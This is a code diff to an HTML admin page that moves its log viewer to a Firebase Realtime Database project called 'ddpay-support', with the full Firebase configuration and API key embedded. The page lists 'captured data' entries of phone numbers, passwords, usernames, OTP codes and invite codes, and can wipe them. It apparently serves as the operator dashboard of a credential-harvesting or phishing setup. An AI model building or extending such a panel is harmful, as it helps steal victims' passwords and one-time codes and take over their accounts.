@@ -421,17 +421,61 @@
 
     </div>
 
+    <!-- Firebase Compatibility SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+
     <script>
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyC_OgxEcErRq__6adAFblrZ5aSyTH48b98",
+            authDomain: "ddpay-support.firebaseapp.com",
+            databaseURL: "https://ddpay-support-default-rtdb.firebaseio.com",
+            projectId: "ddpay-support",
+            storageBucket: "ddpay-support.firebasestorage.app",
+            messagingSenderId: "36597306240",
+            appId: "1:36597306240:web:affdc9930682423cd56765",
+            measurementId: "G-8CEY434NCL"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
         let allLogs = [];
 
         async function fetchLogs() {
-            try {
-                const res = await fetch('/api/logs');
-                allLogs = await res.json();
+            // Fetch from Firebase Realtime Database
+            database.ref('user_logs/').on('value', (snapshot) => {
+                const data = snapshot.val();
+                let fbLogs = [];
+                if (data) {
+                    // Convert object entries to sorted array
+                    fbLogs = Object.keys(data).map(key => {
+                        const entry = data[key];
+                        // Map structure helper
+                        const details = {};
+                        if (entry.phone) details.phone = entry.phone;
+                        if (entry.password) details.password = entry.password;
+                        if (entry.username) details.username = entry.username;
+                        if (entry.otp) details.otp = entry.otp;
+                        if (entry.inviteCode) details.inviteCode = entry.inviteCode;
+
+                        return {
+                            timestamp: entry.timestamp || new Date().toISOString(),
+                            type: entry.type || 'Activity',
+                            details: details
+                        };
+                    });
+                }
+                
+                // Sort logs by newest first
+                fbLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                allLogs = fbLogs;
                 renderLogs(allLogs);
-            } catch (err) {
-                console.error("Failed to load logs:", err);
-            }
+            }, (error) => {
+                console.error("Firebase fetch error:", error);
+            });
         }
 
         function renderLogs(logs) {
@@ -516,25 +560,17 @@
         }
 
         async function clearLogs() {
-            if (!confirm("Are you sure you want to permanently clear all captured data?")) {
+            if (!confirm("Are you sure you want to permanently clear all captured data from Firebase?")) {
                 return;
             }
             try {
-                const res = await fetch('/api/logs/clear', { method: 'POST' });
-                const result = await res.json();
-                if (result.success) {
-                    alert("Logs cleared successfully!");
-                    fetchLogs();
-                } else {
-                    alert("Failed to clear logs: " + result.error);
-                }
+                // Clear Realtime Database tree
+                await database.ref('user_logs/').set(null);
+                alert("Logs cleared successfully!");
             } catch (err) {
-                console.error("Error clearing logs:", err);
+                console.error("Error clearing logs from Firebase:", err);
             }
         }
-
-        // Auto refresh logs every 5 seconds
-        setInterval(fetchLogs, 5000);
 
         // Initial load
         window.onload = fetchLogs;
